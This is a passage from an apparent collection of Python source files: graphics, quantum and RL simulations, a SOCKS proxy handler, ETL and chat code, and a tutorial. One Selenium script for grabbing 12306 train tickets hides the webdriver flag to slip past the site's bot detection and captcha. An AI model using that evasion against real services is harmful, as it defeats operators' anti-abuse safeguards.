a)\n                    break\n\n    os.makedirs(os.path.dirname(output_path), exist_ok=True)\n    image.save(output_path, \"PNG\")\n    print(f\"Your gradient is saved as: {output_path}\")\n\nif __name__ == \"__main__\":\n\n    width = 1920\n    height = 1080\n\n    colors = [\n        (\"#63008780\", 0.0),\n        (\"#12014EC0\", 0.5),\n        (\"#000000FF\", 1.0)\n    ]\n\n    angle = 0\n\n    output_path = \"insert your path here\"\n\n    generate_gradient(width, height, colors, angle, output_path)\n",
    "import unittest\nimport sys\nimport os\n# Add the parent directory to the system path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))\nfrom shor_algorithm import run_shor_algorithm\n\nclass TestShorsAlgorithm(unittest.TestCase):\n    def test_shor_algorithm(self):\n        \"\"\"\n        Verify that Shor's Algorithm correctly factors a given number N.\n\n        Specifically, ensure that the product of the computed factors equals N.\n        \"\"\"\n        N = 15  # Number to factor\n        a = 7   # Random base\n        factor1, factor2 = run_shor_algorithm(N, a)\n        self.assertTrue(factor1 * factor2 == N)\n\n    def test_invalid_base(self):\n        \"\"\"\n        Verify that Shor's Algorithm correctly handles invalid bases.\n\n        Specifically, ensure that invalid bases (where gcd(a, N) != 1) result in None.\n        \"\"\"\n        N = 15\n        a = 1  # Invalid base (gcd(a, N) != 1)\n        factor1, factor2 = run_shor_algorithm(N, a)\n        self.assertIsNone(factor1)\n        self.assertIsNone(factor2)\n\nif __name__ == \"__main__\":\n    unittest.main()\n",
    "import numpy as np\nimport matplotlib.pyplot as plt\n\n# Constants\nhbar = 1.0  # Reduced Planck's constant\nm = 1.0  # Effective mass\nL = 10.0  # Length of the domain\nN = 100  # Number of spatial points\ndx = L / N  # Spatial step size\ndt = 0.01  # Time step size\ntime_steps = 300  # Total number of time steps\nGamma = 0.05  # Constant decoherence rate\nx = np.linspace(0, L, N)\n\n# Initialize wavefunction: Gaussian wave packet\ndef initialize_wave_function(grid, center, width):\n    wave_packet = np.exp(-0.5 * ((grid - center) / width) ** 2)\n    return wave_packet / np.sqrt(np.sum(np.abs(wave_packet) ** 2))  # Normalize\n\npsi = initialize_wave_function(x, L / 2, L / 10)  # Initial wavefunction\n\n# No potential\nV = np.zeros_like(x)\n\n# Store the wavefunction's probability density for visualization\npsi_list = [np.abs(psi) ** 2]\n\n# Function to evolve the wavefunction with decoherence\ndef evolve_with_decoherence(Psi, V, dx, dt, Gamma):\n    # Compute Laplacian\n    laplacian = (np.roll(Psi, -1) - 2 * Psi + np.roll(Psi, 1)) / dx**2\n    # Time evolution with decoherence\n    Psi_new = Psi - (1j * hbar * dt / (2 * m)) * laplacian + (1j * V * dt / hbar) * Psi - Gamma * Psi * dt\n    # Normalize the wavefunction\n    norm_factor = np.sqrt(np.sum(np.abs(Psi_new)**2) * dx)\n    Psi_new /= norm_factor\n    return Psi_new\n\n# Time evolution loop\nfor _ in range(time_steps):\n    psi = evolve_with_decoherence(psi, V, dx, dt, Gamma)\n    psi_list.append(np.abs(psi) ** 2)  # Store probability density\n\n# Visualization: Plot the time evolution of the wavefunction\nplt.figure(figsize=(10, 6))\nfor i in range(0, time_steps, time_steps // 10):  # Plot 10 snapshots\n    plt.plot(x, psi_list[i], label=f'Time {i * dt:.2f}')\nplt.xlabel('Position')\nplt.ylabel('Probability Density |\u03c8|^2')\nplt.title('Time Evolution of Quantum Decoherence')\nplt.legend()\nplt.savefig('Time_evolution_quantum_decoherence.png')  # Save the plot as a PNG file\nplt.show()\n# Define spatial grid\n",
    "#!/usr/bin/env python\n\"\"\"\nSocksiPy + urllib2 handler\n\nversion: 0.3\nauthor: e<e@tr0ll.in>\n\nThis module provides a Handler which you can use with urllib2 to allow it to tunnel your connection through a socks.sockssocket socket, with out monkey patching the original socket...\n\"\"\"\nimport socket\nimport ssl\n\ntry:\n    import urllib2\n    import httplib\nexcept ImportError: # Python 3\n    import urllib.request as urllib2\n    import http.client as httplib\n\nimport socks # $ pip install PySocks\n\ndef merge_dict(a, b):\n    d = a.copy()\n    d.update(b)\n    return d\n\ndef is_ip(s):\n    try:\n        if ':' in s:\n            socket.inet_pton(socket.AF_INET6, s)\n        elif '.' in s:\n            socket.inet_aton(s)\n        else:\n            return False\n    except:\n        return False\n    else:\n        return True\n\nsocks4_no_rdns = set()\n\nclass SocksiPyConnection(httplib.HTTPConnection):\n    def __init__(self, proxytype, proxyaddr, proxyport=None, rdns=True, username=None, password=None, *args, **kwargs):\n        self.proxyargs = (proxytype, proxyaddr, proxyport, rdns, username, password)\n        httplib.HTTPConnection.__init__(self, *args, **kwargs)\n\n    def connect(self):\n        (proxytype, proxyaddr, proxyport, rdns, username, password) = self.proxyargs\n        rdns = rdns and proxyaddr not in socks4_no_rdns\n        while True:\n            try:\n                sock = socks.create_connection(\n                    (self.host, self.port), self.timeout, None,\n                    proxytype, proxyaddr, proxyport, rdns, username, password,\n                    ((socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),))\n                break\n            except socks.SOCKS4Error as e:\n                if rdns and \"0x5b\" in str(e) and not is_ip(self.host):\n                    # Maybe a SOCKS4 server that doesn't support remote resolving\n                    # Let's try again\n                    rdns = False\n                    socks4_no_rdns.add(proxyaddr)\n                else:\n                    raise\n        self.sock = sock\n\nclass SocksiPyConnectionS(httplib.HTTPSConnection):\n    def __init__(self, proxytype, proxyaddr, proxyport=None, rdns=True, username=None, password=None, *args, **kwargs):\n        self.proxyargs = (proxytype, proxyaddr, proxyport, rdns, username, password)\n        httplib.HTTPSConnection.__init__(self, *args, **kwargs)\n\n    def connect(self):\n        SocksiPyConnection.connect(self)\n        self.sock = self._context.wrap_socket(self.sock, server_hostname=self.host)\n        if not self._context.check_hostname and self._check_hostname:\n            try:\n                ssl.match_hostname(self.sock.getpeercert(), self.host)\n            except Exception:\n                self.sock.shutdown(socket.SHUT_RDWR)\n                self.sock.close()\n                raise\n\nclass SocksiPyHandler(urllib2.HTTPHandler, urllib2.HTTPSHandler):\n    def __init__(self, *args, **kwargs):\n        self.args = args\n        self.kw = kwargs\n        urllib2.HTTPHandler.__init__(self)\n\n    def http_open(self, req):\n        def build(host, port=None, timeout=0, **kwargs):\n            kw = merge_dict(self.kw, kwargs)\n            conn = SocksiPyConnection(*self.args, host=host, port=port, timeout=timeout, **kw)\n            return conn\n        return self.do_open(build, req)\n\n    def https_open(self, req):\n        def build(host, port=None, timeout=0, **kwargs):\n            kw = merge_dict(self.kw, kwargs)\n            conn = SocksiPyConnectionS(*self.args, host=host, port=port, timeout=timeout, **kw)\n            return conn\n        return self.do_open(build, req)\n\nif __name__ == \"__main__\":\n    import sys\n    try:\n        port = int(sys.argv[1])\n    except (ValueError, IndexError):\n        port = 9050\n    opener = urllib2.build_opener(SocksiPyHandler(socks.PROXY_TYPE_SOCKS5, \"localhost\", port))\n    print(\"HTTP: \" + opener.open(\"http://httpbin.org/ip\").read().decode())\n    print(\"HTTPS: \" + opener.open(\"https://httpbin.org/ip\").read().decode())\n",
    "import requests\nimport pandas as pd\nimport os\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import close_all_sessions\n\ndef extract() -> dict:\n    \"\"\"Extracts the relevant information from the input data.\"\"\"\n    API_URL = 'https://restcountries.com/v3.1/all?fields=name,currencies,languages,continents,capital'\n    \n    data = requests.get(API_URL).json()\n    return data\n\ndef transform(data:dict)-> pd.DataFrame:\n    \"\"\"Transforms the extracted data into a pandas DataFrame.\"\"\"\n    \n    df = pd.DataFrame(data)\n    \n    print(f'Total number of Countries from API is {len(df)}')\n    \n    # Columns transformation\n    df['name'] = df['name'].apply(lambda x: x['official'] if isinstance(x, dict) else None)\n    df['languages'] = df['languages'].apply(lambda x: list(x.values())[0] if len(x) > 0 else None)\n    df['currencies'] = df['currencies'].apply(lambda x : list(x.values())[0]['name'] if len(x) > 0 else None)\n    df['continents'] = [','.join(map(str,l)) for l in df['continents']]\n    df['capital'] = [','.join(map(str, l)) for l in df['capital']]\n    \n    #reset index\n    df.reset_index(inplace=True)\n    \n    return df[['name', 'capital', 'languages', 'currencies', 'continents']]\n\ndef load(df:pd.DataFrame) -> None:\n    \"\"\"Loads the extracted data into a SQLite.\"\"\"\n\n    # Create a connection to the SQLite database\n    disk_engine = create_engine(\"sqlite:///.\\\\countries.db\")\n    df.to_sql('countries', disk_engine, if_exists='replace')\n    close_all_sessions()\n\n# initalize etl functions\nextracted_data = extract()\ntransformed_data = transform(extracted_data)\ndata = load(transformed_data)\n",
    "import json\nfrom dataclasses import asdict, dataclass\nfrom typing import Any, Dict, List, Union\n\nfrom fission.generate import FissionGenerator\nfrom gen.src.general_generator import GeneralGenerator\nfrom gen.src.knowledge_generator import KnowledgeGenerator\n\n\n@dataclass\nclass GeneralConfig:\n    discipline: str\n    num_tasks: int\n    num_questions: int\n    max_subjects: int = 5\n    max_subtopics: int = 3\n    max_sessions: int = 5\n\n\n@dataclass\nclass KnowledgeConfig:\n    num_tasks: int\n    knowledge_path: str\n    num_sessions: int\n    num_questions: int\n\n\n@dataclass\nclass FissionConfig:\n    num_tasks: int\n    seed_path: str\n    batch: int = 20\n    num_seed: int = 6\n    num_generated: int = 2\n\n\nclass Pipeline:\n    \"\"\"A pipeline for generating and processing educational tasks.\n\n    This pipeline combines two main components:\n    1. A generator (either GeneralGenerator or KnowledgeGenerator) that creates initial seed tasks\n    2. A FissionGenerator that takes the seed tasks and generates variations\n\n    The process involves:\n    1. Generating seed tasks using the configured generator\n    2. Writing these seed tasks to a file\n    3. Using FissionGenerator to create variations based on the seed tasks\n    \"\"\"\n\n    def __init__(\n        self,\n        gen: Union[GeneralGenerator, KnowledgeGenerator] = None,\n        fission: FissionGenerator = None,\n    ):\n        \"\"\"Initialize the pipeline with generator components.\n\n        Args:\n            gen: Either a GeneralGenerator (for discipline-based generation) or\n                KnowledgeGenerator (for knowledge-based generation)\n            fission: FissionGenerator instance for creating task variations\n        \"\"\"\n        self.gen = gen\n        self.fission = fission\n\n    def _save_results(self, data: List, output_path: str):\n        \"\"\"Common method to save results\"\"\"\n        with open(output_path, \"w\") as f:\n            for l in data:\n                f.write(json.dumps(l) + \"\\n\")\n\n    def run(\n        self,\n        seed_output_path: str = None,\n        result_output_path: str = None,\n        gen_config: Union[GeneralConfig, KnowledgeConfig] = None,\n        fission_config: FissionConfig = None,\n    ) -> None:\n        \"\"\"Run the complete pipeline to generate and process tasks.\n\n        Args:\n            gen_config: Configuration for the generator (either GeneralConfig or KnowledgeConfig)\n            fission_config: Configuration for the FissionGenerator\n\n        Raises:\n            ValueError: If the generator type doesn't match the config type\n        \"\"\"\n        # Generate seed data based on generator type\n        if self.gen:\n            print(\"Starting seed generation...\")\n            generator = self.gen()\n            if isinstance(self.gen, (type(GeneralGenerator))):\n                if not isinstance(gen_config, GeneralConfig):\n                    raise ValueError(\"GeneralGenerator requires GeneralConfig\")\n\n                seed = generator.generate(**asdict(gen_config))\n            elif isinstance(self.gen, (type(KnowledgeGenerator))):\n                if not isinstance(gen_config, KnowledgeConfig):\n                    raise ValueError(\"KnowledgeGenerator requires KnowledgeConfig\")\n\n                seed = generator.generate(**asdict(gen_config))\n            else:\n                raise ValueError(f\"Unsupported generator type: {type(self.gen)}\")\n\n            # write seed to the file\n            self._save_results(\n                data=seed,\n                output_path=seed_output_path,\n            )\n            print(\"Finished generating seed...\")\n\n        if self.fission:\n            # Run fission generation\n            print(\"Starting fission...\")\n            fission = self.fission()\n            final = fission.generate(**asdict(fission_config))\n            self._save_results(\n                data=final,\n                output_path=result_output_path,\n            )\n            print(\"Finished generation!\")\n",
    "#  #################################################################\n#  Deep Reinforcement Learning for Online Of\ufb02oading in Wireless Powered Mobile-Edge Computing Networks\n#\n#  This file contains the main code of DROO. It loads the training samples saved in ./data/data_#.mat, splits the samples into two parts (training and testing data constitutes 80% and 20%), trains the DNN with training and validation samples, and finally tests the DNN with test data.\n#\n#  Input: ./data/data_#.mat\n#    Data samples are generated according to the CD method presented in [2]. There are 30,000 samples saved in each ./data/data_#.mat, where # is the user number. Each data sample includes\n#  -----------------------------------------------------------------\n#  |       wireless channel gain           |    input_h            |\n#  -----------------------------------------------------------------\n#  |       computing mode selection        |    output_mode        |\n#  -----------------------------------------------------------------\n#  |       energy broadcasting parameter   |    output_a           |\n#  -----------------------------------------------------------------\n#  |     transmit time of wireless device  |    output_tau         |\n#  -----------------------------------------------------------------\n#  |      weighted sum computation rate    |    output_obj         |\n#  -----------------------------------------------------------------\n#\n#\n#  References:\n#  [1] 1. Liang Huang, Suzhi Bi, and Ying-Jun Angela Zhang, \"Deep Reinforcement Learning for Online Offloading in Wireless Powered Mobile-Edge Computing Networks,\" in IEEE Transactions on Mobile Computing, early access, 2019, DOI:10.1109/TMC.2019.2928811.\n#  [2] S. Bi and Y. J. Zhang, \u201cComputation rate maximization for wireless powered mobile-edge computing with binary computation of\ufb02oading,\u201d IEEE Trans. Wireless Commun., vol. 17, no. 6, pp. 4177-4190, Jun. 2018.\n#\n# version 1.0 -- July 2018. Written by Liang Huang (lianghuang AT zjut.edu.cn)\n#  #################################################################\n\n\nimport scipy.io as sio                     # import scipy.io for .mat file I/\nimport numpy as np                         # import numpy\n\nfrom memory import MemoryDNN\nfrom optimization import bisection\n\nimport time\n\n\ndef plot_rate( rate_his, rolling_intv = 50):\n    import matplotlib.pyplot as plt\n    import pandas as pd\n    import matplotlib as mpl\n\n    rate_array = np.asarray(rate_his)\n    df = pd.DataFrame(rate_his)\n\n\n    mpl.style.use('seaborn')\n    fig, ax = plt.subplots(figsize=(15,8))\n#    rolling_intv = 20\n\n    plt.plot(np.arange(len(rate_array))+1, np.hstack(df.rolling(rolling_intv, min_periods=1).mean().values), 'b')\n    plt.fill_between(np.arange(len(rate_array))+1, np.hstack(df.rolling(rolling_intv, min_periods=1).min()[0].values), np.hstack(df.rolling(rolling_intv, min_periods=1).max()[0].values), color = 'b', alpha = 0.2)\n    plt.ylabel('Normalized Computation Rate')\n    plt.xlabel('Time Frames')\n    plt.show()\n\ndef save_to_txt(rate_his, file_path):\n    with open(file_path, 'w') as f:\n        for rate in rate_his:\n            f.write(\"%s \\n\" % rate)\n\nif __name__ == \"__main__\":\n    '''\n        This algorithm generates K modes from DNN, and chooses with largest\n        reward. The mode with largest reward is stored in the memory, which is\n        further used to train the DNN.\n        Adaptive K is implemented. K = max(K, K_his[-memory_size])\n    '''\n\n    N = 10                     # number of users\n    n = 30000                     # number of time frames\n    K = N                   # initialize K = N\n    decoder_mode = 'OP'    # the quantization mode could be 'OP' (Order-preserving) or 'KNN'\n    Memory = 1024          # capacity of memory structure\n    Delta = 16             # Update interval for adaptive K \u66f4\u65b0K\u7684\u65f6\u95f4\u95f4\u9694 \u539f32\n\n    print('#user = %d, #channel=%d, K=%d, decoder = %s, Memory = %d, Delta = %d'%(N,n,K,decoder_mode, Memory, Delta))\n    # Load data\n    channel = sio.loadmat('./data/data_%d' %N)['input_h']\n    rate = sio.loadmat('./data/data_%d' %N)['output_obj'] # this rate is only used to plot figures; never used to train DROO.\n\n    # increase h to close to 1 for better training; it is a trick widely adopted in deep learning\n    channel = channel * 1000000\n\n    # generate the train and test data sample index\n    # data are splitted as 80:20\n    # training data are randomly sampled with duplication if n > total data size\n\n    split_idx = int(.8* len(channel))\n    num_test = min(len(channel) - split_idx, n - int(.8* n)) # training data size\n\n    #\u4e00\u4e2a\u8f93\u5165\u5c42\u3001\u4e24\u4e2a\u9690\u85cf\u5c42\u548c\u4e00\u4e2a\u8f93\u51fa\u5c42\u7ec4\u6210\u7684\u5168\u8fde\u63a5DNN\uff0c\u5176\u4e2d\u7b2c\u4e00\u548c\u7b2c\u4e8c\u9690\u85cf\u5c42\u5206\u522b\u5177\u6709120\u548c80\u4e2a\u9690\u85cf\u795e\u7ecf\u5143\u3002\n    #DNN\u53ef\u4ee5\u88ab\u5177\u6709\u4e0d\u540c\u9690\u85cf\u5c42\u548c\u795e\u7ecf\u5143\u6570\u91cf\u7684\u5176\u4ed6\u7ed3\u6784\u53d6\u4ee3\uff0c\u751a\u81f3\u53ef\u4ee5\u88ab\u5176\u4ed6\u7c7b\u578b\u7684\u795e\u7ecf\u7f51\u7edc\u53d6\u4ee3\uff0c\u4ee5\u9002\u5e94\u7279\u5b9a\u7684\u5b66\u4e60\u95ee\u9898\uff0c\u4f8b\u5982\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\uff08CNN\uff09\u6216\u9012\u5f52\u795e\u7ecf\u7f51\u7edc\uff08RNN\uff09\u3002\n    mem = MemoryDNN(net = [N, 120, 80, N],\n                    learning_rate = 0.01,\n                    training_interval=10,\n                    batch_size=128,\n                    memory_size=Memory\n                    )\n\n    start_time=time.time()\n\n    rate_his = []\n    r",
    "import flet as ft\r\nimport sqlite3\r\nimport requests\r\nimport json\r\n\r\nconnect = sqlite3.connect(\"user.db\", check_same_thread=False)\r\ncursor = connect.cursor()\r\n\r\nheaders = {\"Content-Type\": \"application/json\"}\r\n\r\ndef chat_main(page: ft.Page):\r\n    page.title = \"Chat\"\r\n    page.theme_mode = \"system\"\r\n\r\n    cursor.execute(\"SELECT name, token FROM users\")\r\n    user = cursor.fetchone()\r\n\r\n    if not user:\r\n        page.controls.clear()\r\n        page.add(ft.Text(\"User not found. Please register first.\"))\r\n        return\r\n\r\n    search_field = ft.TextField(label=\"Search User\", \r\n    expand=True)\r\n    search_results = ft.Column()\r\n\r\n    def search_users(e):\r\n        query = search_field.value.strip()\r\n\r\n        response = requests.post(\r\n        \"http://127.0.0.1:3000/api/search\",\r\n        json={\"name\":query}, \r\n        headers=headers)\r\n\r\n        if response.status_code == 200:\r\n\r\n            results = response.json().get(\"users\", [])\r\n            search_results.controls.clear()\r\n\r\n            for user in results:\r\n                search_results.controls.append(ft.Button(user['name']))\r\n            page.update()\r\n\r\n        else:\r\n            search_results.controls.clear()\r\n            search_results.controls.append(ft.Text(\"No users found\"))\r\n            page.update()\r\n\r\n    search_field.on_change = search_users\r\n\r\n    page.add(\r\n        ft.Column(\r\n            [\r\n                search_field,\r\n                search_results,\r\n                ft.Container(expand=True),\r\n            ],\r\n            expand=True,\r\n            alignment=ft.MainAxisAlignment.CENTER,\r\n        )\r\n    )\r\n    page.update()\r\n",
    "from selenium import webdriver\r\nfrom selenium.webdriver import ActionChains\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nfrom config import Config\r\nfrom selenium.webdriver.common.keys import Keys\r\nimport time\r\nimport select\r\n'''\r\n    \u8fd9\u662f\u4e00\u4ee3\u4ee3\u7801\uff0c\u7528\u4e8e\u62a2\u7968\uff0c\u4f46\u662f\u95ee\u9898\u8f83\u591a\uff0c\u4e0d\u5efa\u8bae\u4f7f\u7528\uff0c\u7559\u7740\u505a\u53c2\u8003\r\n''' \r\n# \u7528\u629b\u51fa\u5f02\u5e38\u6765\u5224\u65ad\u4e00\u4e2a\u5143\u7d20\u5b58\u4e0d\u5b58\u5728\u592a\u6162\u4e86\uff0c\u9700\u8981\u7b495\u79d2\u949f\r\n# def isElementExist(ele):\r\n#     flag = True\r\n#     result = EC.presence_of_element_located((By.XPATH, '//tbody[@id=\"queryLeftTable\"]/tr[1]/td[13]/a'))\r\n#     try:\r\n#         # ele.find_element(by=By.CLASS_NAME, value='btn72')\r\n#         result(ele)\r\n#         return flag\r\n#     except:\r\n#         flag = False\r\n#         return flag\r\n \r\n \r\ndef isElementExist(driver):\r\n    flag=True\r\n    ele = driver.find_elements(by=By.CLASS_NAME, value='btn72')\r\n    if len(ele) == 0:\r\n        flag = False\r\n        return flag\r\n    if len(ele) == 1:\r\n        return flag\r\n    else:\r\n        flag = False\r\n        return flag\r\n \r\n \r\ndef get_ticket(conf, driver, url):\r\n    # \u8fc7\u7f51\u7ad9\u68c0\u6d4b\uff0c\u6ca1\u52a0\u8fd9\u53e5\u7684\u8bdd\uff0c\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\u65f6\u6ed1\u52a8\u9a8c\u8bc1\u7801\u8fc7\u4e0d\u4e86\uff0c\u4f46\u4e8c\u7ef4\u7801\u767b\u5f55\u4e0d\u53d7\u5f71\u54cd\r\n    driver.execute_cdp_cmd(\"Page.addScriptToEvaluateOnNewDocument\", {\"source\": \"\"\"Object.defineProperty(navigator, 'webdriver', {\r\n          get: () => undefined})\"\"\"})\r\n    driver.maximize_window()\r\n    driver.get(url)\r\n    # \u6700\u591a\u7b49\u5f855\u79d2\u4f7f\u9875\u9762\u52a0\u8f7d\u8fdb\u6765\uff0c\u9690\u5f0f\u7b49\u5f85\r\n    driver.implicitly_wait(5)\r\n \r\n    # \u83b7\u53d6\u5e76\u70b9\u51fb\u53f3\u4e0a\u89d2\u767b\u5f55\u6309\u94ae\r\n    login = driver.find_element(by=By.ID, value='J-btn-login')\r\n    login.click()\r\n    driver.implicitly_wait(10)\r\n \r\n    # \u8d26\u53f7\u5bc6\u7801\u767b\u5f55\r\n    username_tag = driver.find_element(by=By.ID, value='J-userName')\r\n    username_tag.send_keys(conf.username)\r\n    password_tag = driver.find_element(by=By.ID, value='J-password')\r\n    password_tag.send_keys(conf.password)\r\n    login_now = driver.find_element(by=By.ID, value='J-login')\r\n    login_now.click()\r\n    time.sleep(20)\r\n \r\n    # # \u8fc7\u6ed1\u52a8\u9a8c\u8bc1\u7801\r\n    # picture_start = driver.find_element(by=By.ID, value='nc_1_n1z')\r\n    # # \u79fb\u52a8\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\uff0c\u5e76\u5de6\u952e\u9f20\u6807\u6309\u4f4f\u5f80\u53f3\u8fb9\u62d6\r\n    # ActionChains(driver).move_to_element(picture_start).click_and_hold(picture_start).move_by_offset(300, 0).release().perform()\r\n    #\r\n    #\r\n    # # \u626b\u7801\u767b\u5f55\r\n    # scan_QR = driver.find_element(by=By.XPATH, value='//*[@id=\"toolbar_Div\"]/div[2]/div[2]/ul/li[2]/a')\r\n    # scan_QR.click()\r\n    # driver.implicitly_wait(10)\r\n \r\n \r\n    # \u70b9\u63d0\u793a\u6846\r\n    # driver.find_element(by=By.XPATH, value='//div[@class=\"dzp-confirm\"]/div[2]/div[3]/a').click()\r\n    # driver.implicitly_wait(5)\r\n \r\n    # \u70b9\u51fb\u8f66\u7968\u9884\u8ba2\u8df3\u8f6c\u5230\u9884\u8ba2\u8f66\u7968\u9875\u9762\r\n    driver.find_element(by=By.XPATH, value='//*[@id=\"link_for_ticket\"]').click()\r\n    driver.implicitly_wait(10)\r\n \r\n    # \u8f93\u5165\u51fa\u53d1\u5730\u548c\u76ee\u7684\u5730\u4fe1\u606f\r\n    # \u51fa\u53d1\u5730\r\n    driver.find_element(by=By.XPATH, value='//*[@id=\"fromStationText\"]').click()\r\n    driver.find_element(by=By.XPATH, value='//*[@id=\"fromStationText\"]').clear()\r\n    driver.find_element(by=By.XPATH, value='//*[@id=\"fromStationText\"]').send_keys(conf.fromstation)\r\n    time.sleep(1)\r\n    driver.find_element(by=By.XPATH, value='//*[@id=\"fromStationText\"]').send_keys(Keys.ENTER)\r\n \r\n    # \u76ee\u7684\u5730\r\n    destination_tag = driver.find_element(by=By.XPATH, value='//*[@id=\"toStationText\"]')\r\n    destination_tag.click()\r\n    destination_tag.clear()\r\n    destination_tag.send_keys(conf.destination)\r\n    time.sleep(1)\r\n    destination_tag.send_keys(Keys.ENTER)\r\n    driver.implicitly_wait(5)\r\n \r\n    # \u51fa\u53d1\u65e5\u671f\r\n    date_tag = driver.find_element(by=By.XPATH, value='//*[@id=\"train_date\"]')\r\n    date_tag.click()\r\n    date_tag.clear()\r\n    date_tag.send_keys(conf.date)\r\n    time.sleep(1)\r\n    query_tag = driver.find_element(by=By.XPATH, value='//*[@id=\"query_ticket\"]')\r\n \r\n    start = time.time()\r\n \r\n    while True:\r\n        driver.implicitly_wait(5)\r\n        # \u70b9\u51fb\u67e5\u8be2\r\n        driver.execute_script(\"$(arguments[0]).click()\", query_tag)\r\n \r\n        # \u5224\u65ad\u9875\u9762\u4e2d\u6709\u6ca1\u6709\u201c\u9884\u8ba2\u201d\u6309\u94ae\uff0c\u5982\u679c\u6ca1\u6709\u9884\u8ba2\u6309\u94ae\u5c31\u4e0d\u65ad\u67e5\u8be2\u76f4\u5230\u8f66\u7968\u5f00\u552e\r\n        if not isElementExist(driver):\r\n            # \u8f66\u7968\u5904\u4e8e\u5f85\u5f00\u552e\u72b6\u6001\r\n            print(f\"15\u70b930\u5206\u8d77\u552e\uff0c\u73b0\u5728\u662f{time.strftime('%H:%M:%S', time.localtime())}\uff0c\u8fd8\u672a\u5f00\u59cb\u552e\u7968\")\r\n            # \u6bcf\u9694\u4e24\u5206\u949f\u5237\u65b0\u4e00\u6b21\uff0c\u5426\u52193\u5206\u949f\u5185\u65e0\u8d2d\u7968\u64cd\u4f5c12306\u7cfb\u7edf\u4f1a\u81ea\u52a8\u767b\u51fa\r\n            if time.time() - start >= 120:\r\n                driver.refresh()\r\n                start = time.time()\r\n            # \u5ef6\u65f61\u79d2\u9632\u6b62\u8fc7\u4e8e\u5feb\u901f\u5730\u70b9\u51fb\u5bfc\u81f4\u67e5\u8be2\u8d85\u65f6\uff0c\u5f53\u7136\u5076\u5c14\u8fd8\u662f\u4f1a\u51fa\u73b0\u8d85\u65f6\u73b0\u8c61\uff0c\u4e0d\u8fc7\u8d85\u65f6\u4e5f\u6ca1\u5173\u7cfb\uff0c\u4e00\u822c\u7b49\u5f856\u79d2\u4e4b\u540e\u5c31\u4f1a\u7ee7\u7eed\u81ea\u52a8\u67e5\u8be2\r\n            time.sleep(1)\r\n            continue\r\n \r\n        # \u83b7\u53d6\u6240\u6709\u8f66\u7968\r\n        tickets = driver.find_elements(by=By.XPATH, value='//*[@id=\"queryLeftTable\"]/tr')\r\n        # \u6bcf\u5f20\u8f66\u7968\u6709\u4e24\u4e2atr\uff0c\u4f46\u662f\u7b2c\u4e8c\u4e2atr\u6ca1\u4ec0\u4e48\u7528\r\n        tickets = [tickets[i] for i in range(len(tickets) - 1) if i % 2 == 0]\r\n        #print(tickets)\r\n        for ticket in tickets:\r\n            # \u5982\u679c\u8f66\u7968\u7684\u8f66\u6b21\u7b49\u4e8e\u60f3\u8981\u7684\u8f66\u6b21\u5e76\u4e14\u786c\u5367\u7684\u72b6\u6001\u4e0d\u662f\u5019\u8865\u5219\u70b9\u51fb\u9884\u8ba2\r\n            #if ticket.find_element(by=By.CLASS_NAME,value='cdz').text== conf.fromstation:\r\n                #print(ticket.find_element(by=By.CLASS_NAME,value='number').text)\r\n                # value = '//td[8]'\u8868\u793a\u786c\u5367\uff0ctd[10]\u8868\u793a\u786c\u5ea7\r\n            if ticket.find_element(by=By.CLASS_NAME,value='number').text == conf.trainnumber and ticket.find_element(by=By.XPATH, value='//td[8]').text != \"\u5019\u8865\":\r\n ",
    "# %% ===================================================================== #\n#                                   ABOUT                                  #\n# ======================================================================== #\n# This code cover the essential concepts of Python to achieve high efficiency in coding operations.\n\n\n\n# %% ===================================================================== #\n#                                 LIBRARIES                                #\n# ======================================================================== #\nimport pandas as pd \nimport keyword\n\n\n\n# %% ===================================================================== #\n#                                 COMMENTS                                 #\n# ======================================================================== #\n# Note: Python ignores the string literals that are not assigned to a variable. \n\"\"\"So, we can use these string literals as comments, or the usual hash preceded statements.\"\"\"\n\n\n\n# %% ===================================================================== #\n#                     MULTIPLE ASSIGNMENT OF VARIABLES                     #\n# ======================================================================== #\n# Assigning same value to multiple variables\na = b = c = 100\nprint(a,b,c)\n\n# Assigning different values to multiple variables \na,b,c = 1,2.5,'this_string'\nprint(a,b,c)\n\n# Practical example of swapping two variables \na, b = 5, 10\na, b = b, a\nprint(a, b)\n\n\n\n# %% ===================================================================== #\n#                        LOCAL AND GLOBAL VARIABLES                        #\n# ======================================================================== #\ndef f():\n    a = \"local variable\"\n    print(a)\n\n# Accessing it globally will raise error \nprint(a)\n\n# Global variable on the other hand are versatile\ndef g():\n    global b\n    b = \"global variable\"\n    print(b)\n\nprint(b)\n# - Note that while declaring a global variable inside a function, the statement declaring it to be global is essential, before defining its value.\n\n\n\n# %% ===================================================================== #\n#                        OBJECT REFERENCE IN PYTHON                        #\n# ======================================================================== #\n# Let us assign a variable x to a value 5\nx = 5\n\n#        x\n#        \u2193\n#        \u2193\n# +-------+\n# |       |\n# |   5   |\n# |       |\n# +-------+\n\n# When x = 5 is executed, Python creates an object to represent the value 5 and makes x reference this object.\n\n# Now, if we assign another variable y to the variable x.\ny = x\n\n#        x\n#        \u2193\n#        \u2193\n# +-------+ \u2190 \u2190 y\n# |       |\n# |   5   |\n# |       |\n# +-------+\n\n# When Python encounters the first statement (x=5), it creates an object for the value 5 and makes x reference it. The second statement (y=x) creates y and references the same object as x, not x itself. This is called a Shared Reference, where multiple variables reference the same object.\n\n# Now if we write x = 'bcy'\nx = 'bcy'\n\n# Python creates a new object for the value \"bcy\" and makes x reference this new object. The variable y remains unchanged, still referencing the original object 5.\n\n#         x           y  \n#         \u2193           \u2193\n#         \u2193           \u2193\n# +-------+   +-------+\n# |       |   |       |\n# |  bcy  |   |   5   |\n# |       |   |       |\n# +-------+   +-------+\n\n# If we now assign a new value to y:\ny = 'git'\n\n# Python creates yet another object for 'git' and updates y to reference it. The original object 5 no longer has any references and becomes eligible for garbage collection.\n\n#         x                       y\n#         \u2193                       \u2193\n#         \u2193                       \u2193\n# +-------+   +-------+   +-------+\n# |       |   |       |   |       |\n# |   bcy |   |   5   |   |   git |\n# |       |   |       |   |       |\n# +-------+   +-------+   +-------+\n\n# We can always delete a variable in python using the `del` keyword. Trying to access a variable deleted from the namespace or an undefined one, both raise `NameError`\nx = 10\ndel x \nprint(x)  # deleted variable\n\nprint(z)  # undefined 